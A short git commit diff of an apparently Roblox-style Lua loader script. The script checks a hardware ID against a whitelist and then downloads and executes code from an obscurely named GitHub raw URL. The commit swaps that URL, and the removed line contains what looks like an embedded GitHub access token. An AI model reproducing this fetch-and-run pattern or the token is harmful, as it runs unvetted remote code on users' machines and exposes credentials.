941628a1bf7cf459f1f7f4cd097c53c4b277c53c
ground <161968536+groundded@users.noreply.github.com>
2024-07-23 20:11:06 +0400

    Update sdansjdavamsodap.lua

--- sdansjdavamsodap.lua
+++ sdansjdavamsodap.lua
@@ -5,7 +5,7 @@ local HWID = "hwid here" -- NOTE IMPORTANT: I didnt put my HWID / ClientID for p
 
 for i, v in pairs(HWIDTable) do
     if v == HWID then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/groundded/j1v3ytg2c1cg4f1c2gf4x1hf3x21jg3x12/main/b1tco1n1s4v3r1fy4cc0u1n75ecur1tym3a5ur35?token=GHSAT0AAAAAACT2ODLB52LX3DIQFLWYTSYKZT5IZ5Q"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/groundded/schemabs/main/sdgajhsdvghjwcvkashdvwjhkachfgci13y21ckasdasdasd"))()
     elseif v ~= HWID then
         print("The HWID is not Whitelisted. HWID: ", HWID)
     end
